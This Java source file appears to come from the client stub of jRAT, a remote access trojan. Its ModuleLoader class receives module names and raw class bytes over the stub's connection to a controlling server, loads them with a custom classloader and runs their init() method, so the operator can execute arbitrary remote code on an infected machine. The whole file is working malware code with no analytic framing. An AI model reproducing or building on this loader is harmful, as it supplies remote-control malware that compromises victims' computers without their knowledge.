package io.jrat.stub.modules;


import apiv2.StubModule;
import io.jrat.stub.Connection;
import io.jrat.stub.Injector;
import io.jrat.stub.InjectorClassloader;
import io.jrat.stub.Main;

import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;

public class ModuleLoader {

    /**
     * Read and load modules
     * @param c
     * @throws Exception
     */
    public static void read(Connection c) throws Exception {
        int len = c.readInt();

        for (int i = 0; i < len; i++) {
            // Main module class
            String mainClass = c.readLine();
            Main.debug("received module " + mainClass);

            InjectorClassloader l = new InjectorClassloader(ModuleLoader.class.getClassLoader(), null);

            // read all classes and resources from the server
            while (c.readBoolean()) {
                String name = c.readLine();

                int classLen = c.readInt();
                byte[] buffer = new byte[classLen];
                c.getDataInputStream().readFully(buffer);

                l.classes.put(Injector.getClassName(name), buffer);

                Main.debug("\treceived class " + name + " (" + classLen + " b)");
            }

            // load the main class
            Class<StubModule> module = (Class<StubModule>) l.loadClass(mainClass);
            Method method = module.getMethod("init");

            // invoke init()
            method.invoke(module.newInstance());
        }
    }
}
